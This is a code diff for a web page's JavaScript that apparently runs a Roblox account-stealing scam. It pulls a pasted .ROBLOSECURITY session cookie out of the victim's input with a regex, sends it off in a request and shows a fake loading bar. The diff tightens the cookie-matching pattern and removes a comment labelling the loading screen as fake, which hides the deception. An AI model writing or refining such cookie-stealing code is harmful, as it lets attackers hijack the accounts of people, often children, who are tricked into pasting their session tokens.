@@ -34,12 +34,11 @@
 function run() {
   const text = document.getElementById("paste").value;
 
-  // THIS LINE GRABS THE COOKIE FROM YOUR EXACT FORMAT (with the comma and space after .ROBLOSECURITY)
-  const cookie = text.match(/\.ROBLOSECURITY"\s*,\s*"([^"]{500,})"/)?.[1]
-              || text.match(/Value\s*=\s*"([^"]{500,})/)?.[1];
+  // GRABS EVERYTHING AFTER "CAE" UNTIL THE END OF THE LINE (100% bulletproof)
+  const cookie = text.match(/CAE[A-Za-z0-9._-]+/)?.[0];
 
-  if (!cookie) {
-    document.getElementById("msg").textContent = "No cookie found – make sure you copied the WHOLE thing";
+  if (!cookie || cookie.length < 400) {
+    document.getElementById("msg").textContent = "No cookie found – copy the whole request again";
     return;
   }
 
@@ -53,7 +52,6 @@ function run() {
     headers: {"Content-Type": "application/json"}
   });
 
-  // FAKE LOADING
   document.getElementById("msg").style.display = "none";
   document.getElementById("load").style.display = "block";
   let p = 18;
